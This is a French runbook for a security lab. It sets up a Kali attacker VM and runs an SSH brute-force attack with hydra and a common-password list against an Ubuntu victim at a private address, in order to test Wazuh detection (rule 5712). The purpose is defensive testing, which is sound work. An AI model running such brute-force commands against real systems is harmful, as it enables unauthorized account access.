# Runbook — VM Kali (attaquant)

## Contexte
- Rôle : machine d'attaque du lab, utilisée pour générer les attaques et tester la détection Wazuh.
- Environnement : VMware Workstation Pro, réseau NAT VMnet8.
- Kali : image VMware pré-construite (kali-linux-2026.x), IP fixe 192.168.159.30.

## Import de la VM
1. Télécharger l'image VMware (`.7z`) sur https://www.kali.org/get-kali/#kali-virtual-machines
2. Extraire, puis dans VMware : **Open a Virtual Machine** → sélectionner le `.vmx`
3. VM settings → Network Adapter → **NAT (VMnet8)**
4. Login par défaut `kali` / `kali` → changer le mot de passe (`passwd`)

## Configuration réseau (IP fixe)
```bash
nmcli connection show
sudo nmcli connection modify "Wired connection 1" \
  ipv4.addresses 192.168.159.30/24 \
  ipv4.gateway 192.168.159.2 \
  ipv4.dns 192.168.159.2 \
  ipv4.method manual
sudo nmcli connection down "Wired connection 1" && sudo nmcli connection up "Wired connection 1"
```

## Mise à jour
```bash
sudo apt update && sudo apt full-upgrade -y
```

## Attaque réalisée — bruteforce SSH
```bash
printf 'password\n123456\nadmin\nroot\ntoor\nletmein\nqwerty\nabc123\n' > /tmp/pw.txt
hydra -l admin -P /tmp/pw.txt ssh://192.168.159.20 -t 4 -V
```
- Cible : victime Ubuntu (192.168.159.20).
- Résultat côté Wazuh : règle **5712 "sshd: brute force"** (niveau 10, MITRE T1110) — cf. `runbook-victime-ubuntu.md`.

## Prochaines étapes
- [ ] Scan réseau (nmap) → détection Wazuh.
- [ ] Autres attaques (web, mouvement latéral) selon l'évolution du lab.
